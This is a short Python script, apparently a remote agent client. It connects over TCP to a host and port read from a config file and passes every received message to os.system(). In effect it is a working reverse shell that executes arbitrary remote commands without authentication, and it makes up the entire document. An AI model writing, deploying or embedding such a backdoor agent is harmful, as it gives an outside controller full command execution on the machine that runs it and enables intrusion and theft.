#!/usr/bin/env python

import os
import sys
from socket import socket, AF_INET, SOCK_STREAM
sys.path.insert(0, '..')
sys.dont_write_bytecode = True
try:
    from lib.log import get_logger
    from lib.config import get_config
except:
    raise

LOG = get_logger()
HOST = get_config('../cfg/client.toml')['client']['interface']
PORT = get_config('../cfg/client.toml')['client']['port']


def connect_agent():
    sock = socket(AF_INET, SOCK_STREAM)
    addr = (HOST, PORT)
    LOG.info('Connecting to {} port {}.'.format(str(HOST), str(PORT)))
    sock.connect(addr)
    while True:
        data = sock.recv(1024)
        if not data:
            continue
        LOG.info('Received {}'.format(data))
        os.system(data)
